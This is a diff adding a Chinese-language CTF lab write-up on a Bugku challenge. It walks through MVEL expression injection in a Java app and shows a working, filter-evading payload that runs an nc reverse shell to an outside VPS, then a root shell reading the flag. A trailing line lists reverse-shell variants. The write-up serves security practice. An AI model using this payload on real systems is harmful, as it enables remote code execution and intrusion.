@@ -11221,6 +11221,64 @@ ctfshow{879b92f5-af3c-40dd-bb63-c6bcc0086d1a}
 
 ## Bugku
 
+### Java EL表达式注入
+
+进入靶机后，用`Burp Suite`抓包，点击保存，可以发现`POST`请求`/updateSysSetting`的响应头中有`source: /source.zip`。下载源代码，进行代码审计。
+
+在`source\src\main\java\com\example\javamvelctf\controller\MVELTest.java`中有关键代码：
+
+```java
+Object result;
+List<String> allowedIP;
+try {
+    result = MVEL.eval(req.getExp());
+    System.out.println(result.toString());
+} catch (Exception e) {
+    response.setStatus(500);
+    return new ResponseObj(false, "表达式语法错误", e.getMessage());
+}
+```
+
+我们需要一台`VPS`用于反弹shell。先在Google Cloud启动VPS，然后用`gcloud`连接VPS。
+
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
+
+在VPS中输入`nc -lvnp port`监听端口，比如我在`Google Cloud`中的`ctf-vps`的`IP`是`34.19.3.124`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+使用`Burp Suite`构造请求，尝试反弹`shell`：
+
+```json
+{
+    "exp": "''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 34.19.3.124 9999 -e /bin/sh'))",
+    "limit": "60"
+}
+```
+
+反弹`shell`成功，成功读取`flag`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 160.202.254.160 34437
+whoami
+root
+find / -name "flag" 
+/flag
+cat /flag
+flag{f78fd152db94a1ff816f5c1bb507bbe4}
+```
+
+提交即可。
+
+------
+
 ### Apache Log4j2 RCE
 
 > 描述： /bin/bash：x ； /bin/sh √ ; /dev/tcp × ； nc -e x ; nc a.cc 1234 -e √ ;
